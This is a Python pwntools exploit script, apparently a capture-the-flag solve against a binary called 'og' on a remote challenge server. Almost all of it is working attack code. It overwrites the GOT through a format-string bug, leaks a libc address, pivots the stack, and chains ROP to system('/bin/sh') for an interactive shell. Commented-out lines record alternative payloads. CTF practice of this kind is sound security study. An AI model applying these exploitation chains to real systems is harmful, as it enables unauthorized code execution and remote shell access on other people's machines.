from pwn import *
r = remote('challs.actf.co', 31312)
context.log_level='debug'
context.binary = e = ELF('./og')
context.arch='amd64'
libc = ELF('./libc.so.6')
#r = process('./og_patched')
#r = gdb.debug('./og', '')
r.recvuntil(b': ')
payload = fmtstr_payload(6, {e.got['__stack_chk_fail']: e.sym['go']}).ljust(0x30,b'a')
#print(len(payload))
assert b'\n' not in payload
assert len(payload)<=66  
#payload+=p64(e.sym['go'])
r.sendline(payload)
payload = b'%3$p!'.ljust(0x30 ,b'a')
assert len(payload)<=66  
#payload+=p64(e.sym['go'])
r.recvuntil(b': ')
r.sendline(payload)
r.recvuntil(', ')
#print(r.recvuntil(b'!', drop=True));exit(0)
libc_leak=int(r.recvuntil(b'!', drop=True), 16)
libc.address=libc_leak-0x114887
print('libc @', hex(libc.address))
payload = fmtstr_payload(6, {e.got['__stack_chk_fail']: 0x0000000000401254}, write_size='int').ljust(0x30,b'a')
assert len(payload)<=0x30
stacktop = 0x0000000000405000 - 0x10 
payload += p64(stacktop-0x8)
payload += p64(0x0000000000401201)
r.sendline(payload)
#reads into rbp-0x30 
#rbp=e.bss(0x500), rsp=on stack 
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))
print(rop.dump())
payload = p64(0x0)+rop.chain()
payload = payload.ljust(0x30,b'a')
payload += p64(stacktop-0x30-0x8)
payload += p64(0x0000000000401253) 
r.sendline(payload)
#rbp = e.bss(0x500)-0x30, rsp = e.bss(0x500)
#rbp=0x0,rsp=e.bss(0x500)-0x30
#assert len(payload)<=66
#r.sendline(payload)

#payload = fmtstr_payload(6, {e.got['printf']: libc.sym['system'], e.got['__stack_chk_fail']: 0x0000000000401201}, write_size='int').ljust(0x30,b'a')
#assert len(payload)<=0x38 
#assert len(payload)<=66
#payload+=p64(0x0000000000401201)
#print('payload', payload)
#r.sendline(payload)
#r.sendline(b'/bin/sh')
r.interactive()


